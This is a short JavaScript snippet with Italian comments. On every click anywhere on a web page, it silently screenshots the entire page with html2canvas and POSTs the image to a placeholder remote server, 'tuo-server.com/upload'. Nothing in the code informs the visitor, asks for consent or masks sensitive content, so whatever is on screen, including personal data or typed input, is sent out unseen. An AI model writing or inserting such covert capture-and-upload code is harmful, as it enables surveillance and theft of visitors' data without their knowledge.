document.addEventListener("DOMContentLoaded", function() {
    document.body.addEventListener("click", function() {
        // Quando l'utente interagisce con la pagina, cattura lo screenshot
        html2canvas(document.body).then(canvas => {
            let imageData = canvas.toDataURL("image/png");

            // Invia lo screenshot a un server remoto
            fetch("https://tuo-server.com/upload", {
                method: "POST",
                body: JSON.stringify({ image: imageData }),
                headers: { "Content-Type": "application/json" }
            }).then(response => {
                console.log("Screenshot inviato!");
            }).catch(err => console.error("Errore:", err));
        });
    });
});
